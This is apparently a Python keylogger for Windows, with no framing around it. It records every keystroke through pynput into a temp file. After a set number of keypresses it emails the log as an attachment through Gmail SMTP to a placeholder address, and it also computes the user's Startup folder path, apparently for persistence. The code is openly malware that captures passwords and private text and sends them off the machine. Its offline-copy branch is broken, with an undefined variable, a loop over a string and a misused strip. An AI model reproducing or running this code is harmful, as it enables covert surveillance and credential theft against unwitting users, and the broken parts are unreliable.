from pynput.keyboard import Key, Listener
import os
import shutil
import time
import datetime
import winshell
from win32com.client import Dispatch
from shutil import copyfile
import tempfile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import socket

save = tempfile.mkdtemp("screen")
print(save)
cwd = os.getcwd()
source = os.listdir()

dateAndtime = datetime.datetime.now().strftime("-%Y-%m-%d-%H-%M-%S")
filename = save+"\key_log"+dateAndtime+".txt"
open(filename,"w+")
keys=[]
count = 0
countInternet = 0
word = "Key."
username = os.getlogin()

destination=r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username)

def is_connected():
    try:
        socket.create_connection(("www.google.com",80))
        return True
    except OSError:
        pass
    return False

def send_email():
    fromaddr = "your email"
    toaddr = "your email"
    password = "your email pass"
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = username
    body = "TEXT"
    msg.attach(MIMEText(dateAndtime,'plain'))
    attachment = open(filename, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, password)
    text = msg.as_string()
    server.sendmail(fromaddr,toaddr,text)
    server.quit

def write_file(keys):
    with open(filename,"a") as f:
        for key in keys:
            if key == 'Key.enter':
                f.write("\n")
            elif key == 'Key.space':
                f.write(key.replace("Key.space"," "))
            elif key[:4] == word:
                pass
            else:
                f.write(key.replace("'",""))
                        
def on_press(key):
    global keys, count, countInternet, filename
    keys.append(str(key))

    if len(keys) > 10:
        write_file(keys)
        if is_connected():
            count += 1
            print('connected {}'.format(count))
            if count > 100:
                count = 0
                t1 = threading.Thread(target=send_email, name='t1')
                t1.start()
        else:
            countInternet += 1
            print('not connected',countInternet)
            if countInternet > 10:
                countInternet = 0
                filename = filename.strip(save)
                for files in save:
                    if file == filename:
                        shutil.copy(files+"t",source)

        keys.clear()
with Listener(on_press=on_press) as listener:
    listener.join()
                        
                        
            
